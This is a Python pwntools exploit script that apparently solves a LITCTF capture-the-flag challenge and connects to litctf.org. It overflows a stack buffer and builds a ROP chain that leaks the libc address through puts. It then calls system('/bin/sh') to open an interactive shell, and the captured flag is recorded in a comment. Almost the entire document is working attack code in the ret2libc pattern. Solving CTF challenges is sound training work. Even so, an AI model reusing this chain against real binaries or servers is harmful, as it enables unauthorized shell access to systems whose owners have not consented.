#!/usr/bin/env python3

from pwn import *
from time import sleep

exe = ELF("./vuln_patched")
libc = exe.libc

context.binary = exe

REMOTE_NC_CMD    = "nc litctf.org 31774"    # `nc <host> <port>`

bstr = lambda x: str(x).encode()
ELF.binsh = lambda self: next(self.search(b"/bin/sh\0"))

GDB_SCRIPT = """
set follow-fork-mode parent
set follow-exec-mode same
"""

def conn():
    if args.LOCAL:
        return process([exe.path])
    
    if args.GDB:
        return gdb.debug([exe.path], gdbscript=GDB_SCRIPT)
    
    return remote(REMOTE_NC_CMD.split()[1], int(REMOTE_NC_CMD.split()[2]))

def main():
    r = conn()
    
    rop = ROP(exe)

    payload = b"A"*0x108 + p64(rop.rdi.address) + p64(exe.got.puts) + p64(exe.plt.puts) + p64(exe.sym.main)

    r.sendline(payload)
    r.sendline(b"ok")
    r.recvuntil(b"ok\n")
    libc.address = u64(r.recv(6)+b"\0\0") - libc.sym.puts
    
    payload = b"A"*0x108 + p64(rop.rdi.address) + p64(libc.binsh()) + p64(rop.ret.address) + p64(libc.sym.system)

    r.sendline(payload)
    r.sendline(b"ok")

    r.interactive()
    #LITCTF{cl34r1y_0n3_0f_7h3_p4ir1ng5_4r3_4_l1t7l3_5p3ci4l_f480531b}

if __name__ == "__main__":
    main()